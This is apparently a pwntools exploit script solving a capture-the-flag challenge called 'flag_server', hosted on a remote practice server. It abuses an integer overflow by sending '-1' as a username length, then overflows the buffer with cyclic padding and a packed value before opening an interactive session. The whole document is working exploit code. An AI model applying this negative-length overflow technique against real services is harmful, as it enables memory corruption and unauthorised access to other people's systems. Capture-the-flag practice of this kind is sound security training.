from pwn import *


# p = process("./flag_server")
p = remote("node4.buuoj.cn", 29731)

context.log_level = "debug"

# int overflow
p.sendlineafter("your username length: ", "-1")
p.sendlineafter("whats your username?\n", cyclic(0x40)+p32(1))

print(p.recv())
p.interactive()


